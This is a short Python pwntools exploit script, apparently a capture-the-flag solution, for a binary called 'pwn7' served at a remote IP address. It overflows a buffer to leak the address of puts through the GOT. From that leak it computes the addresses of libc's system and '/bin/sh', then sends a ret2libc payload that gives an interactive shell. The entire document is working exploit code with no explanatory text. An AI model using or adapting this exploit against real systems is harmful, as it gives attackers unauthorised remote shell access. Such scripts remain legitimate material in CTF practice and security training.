from pwn import * 
context.log_level = 'debug'

#cn = process('./pwn7')
cn = remote('128.199.220.74', 10007)
bin = ELF('./pwn7')
libc = ELF('./libc.so.6_pwn8')
#libc = ELF('/lib32/libc.so.6')

p3ret = 0x08048559

cn.recv()
pay1 = p32(bin.got['puts']) + (0x10-4)*'a' + 'bbbb'
pay1 += p32(bin.symbols['main'])
cn.send(pay1)
p_puts = int(cn.recv()[:8],16)
p_system = p_puts - libc.symbols['puts'] + libc.symbols['system']
p_sh = p_puts - libc.symbols['puts'] + libc.search('/bin/sh').next()
pay2 = p32(bin.got['puts']) + (0x10-4)*'a' + 'bbbb'
pay2 += p32(p_system) + 'bbbb' + p32(p_sh)
cn.sendline(pay2)
cn.interactive()




